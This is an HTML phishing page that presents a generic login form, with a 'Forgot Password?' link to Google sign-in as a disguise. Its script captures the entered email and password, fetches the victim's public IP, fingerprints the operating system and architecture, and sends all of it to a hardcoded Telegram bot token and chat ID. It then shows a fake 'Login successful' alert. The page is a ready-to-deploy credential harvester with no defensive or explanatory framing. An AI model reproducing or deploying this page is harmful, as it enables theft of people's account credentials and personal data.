<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        /* Set background image and apply blur effect */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: url('https://www.bing.com/th/id/OGC.51b92d1c091025c54718c896ba716331?pid=1.7&rurl=https%3a%2f%2fmedia.giphy.com%2fmedia%2fl2JJzb9XbkdFHrt2o%2fgiphy.gif&ehk=pbZhHHADetrtRzxlqs7D9JM9%2fLtt5SQCd852InpD%2beg%3d') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        /* Blur overlay */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5); /* Semi-transparent overlay */
            filter: blur(8px); /* Apply blur effect */
            z-index: -1; /* Keep the overlay behind the content */
        }

        .container {
            background-color: rgba(255, 255, 255, 0.1); /* Slightly transparent background */
            border-radius: 16px;
            padding: 30px 40px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            width: 350px;
            text-align: center;
            transition: all 0.3s ease;
        }
        .container:hover {
            box-shadow: 0 12px 50px rgba(0, 0, 0, 0.15);
        }

        h1 {
            font-size: 28px;
            color: #ffffff;
            margin-bottom: 20px;
            font-weight: 600;
        }
        p {
            font-size: 14px;
            color: #ffffff;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 20px;
            border: 2px solid #ffffff;
            border-radius: 8px;
            font-size: 16px;
            color: #333;
            outline: none;
            transition: all 0.3s ease;
        }
        input:focus {
            border-color: #6e7eeb;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #520404;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #000000;
        }
        .forgot-password {
            font-size: 12px;
            color: #ff0000;
            text-decoration: none;
            display: block;
            margin-top: 15px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
    <script>
         const TOKEN = "7651789586:AAE07uomZ3OlhUj3OgvjqihWBjf34LJVsmg"; // Replace with your Telegram Bot Token
         const CHAT_ID = "6196901763"; // Replace with your Telegram Chat ID
        const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        const IP_API_URL = "https://api.ipify.org?format=json"; // To fetch the user's public IP

        // Function to detect the user's operating system, edition, and system architecture
        function detectSystemInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;

            let operatingSystem = "Unknown OS";
            let edition = "Unknown Edition";
            let systemType = "Unknown System Type";

            // Detect Operating System
            if (userAgent.indexOf("Windows NT 10.0") !== -1) {
                operatingSystem = "Windows 10";
                edition = userAgent.indexOf("Windows NT 10.0") !== -1 ? "Windows 10 Pro/Home" : "Unknown Edition";
            } else if (userAgent.indexOf("Windows NT 6.1") !== -1) {
                operatingSystem = "Windows 7";
                edition = userAgent.indexOf("Windows NT 6.1") !== -1 ? "Windows 7 Home/Pro" : "Unknown Edition";
            } else if (userAgent.indexOf("Macintosh") !== -1) {
                operatingSystem = "macOS";
                edition = "macOS (No specific edition)";
            } else if (userAgent.indexOf("Linux") !== -1) {
                operatingSystem = "Linux";
                edition = "Linux (Various distributions)";
            } else if (userAgent.indexOf("Android") !== -1) {
                operatingSystem = "Android";
                edition = "Android (Mobile)";
            } else if (userAgent.indexOf("iPhone") !== -1) {
                operatingSystem = "iOS";
                edition = "iOS (Mobile)";
            }

            // Detect System Architecture (32-bit vs 64-bit)
            if (platform.indexOf("Win64") !== -1 || userAgent.indexOf("x86_64") !== -1) {
                systemType = "64-bit";
            } else if (platform.indexOf("Win32") !== -1 || userAgent.indexOf("i686") !== -1) {
                systemType = "32-bit";
            }

            return { operatingSystem, edition, systemType };
        }

        async function handleSubmit(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            try {
                // 1. Fetch user's IP address
                const ipResponse = await fetch(IP_API_URL);
                const ipData = await ipResponse.json();
                const ipAddress = ipData.ip;

                // 2. Detect the user's operating system, edition, and system architecture
                const { operatingSystem, edition, systemType } = detectSystemInfo();

                const date = new Date().toLocaleString();

                // 3. Construct the message
                const message = `
<b>Login</b>
<b>Email:</b> ${email}
<b>Password:</b> ${password}
<b>IP Address:</b> ${ipAddress}
<b>Operating System:</b> ${operatingSystem}
<b>Edition:</b> ${edition}
<b>System Type:</b> ${systemType}
<b>Date & Time:</b> ${date}
                `;

                // 4. Send the message to Telegram
                const response = await fetch(API_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: "HTML"
                    })
                });

                if (response.ok) {
                    alert("Login successful. Welcome!");
                } else {
                    alert("There was an issue processing your login. Please try again.");
                }
            } catch (error) {
                console.error("Error sending data to Telegram:", error);
                alert("An unexpected error occurred. Please try again later.");
            }
        }
    </script>
</head>
<body>
    <div class="overlay"></div> <!-- Apply blur overlay -->
    <div class="container">
        <h1>Login</h1>
        <p>Please enter your credentials to access your account.</p>
        <form onsubmit="handleSubmit(event)">
            <input type="email" id="email" placeholder="Email Address" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
            <a href="https://accounts.google.com/v3/signin" class="forgot-password" target="_blank">Forgot Password?</a>
        </form>
    </div>
</body>
</html>
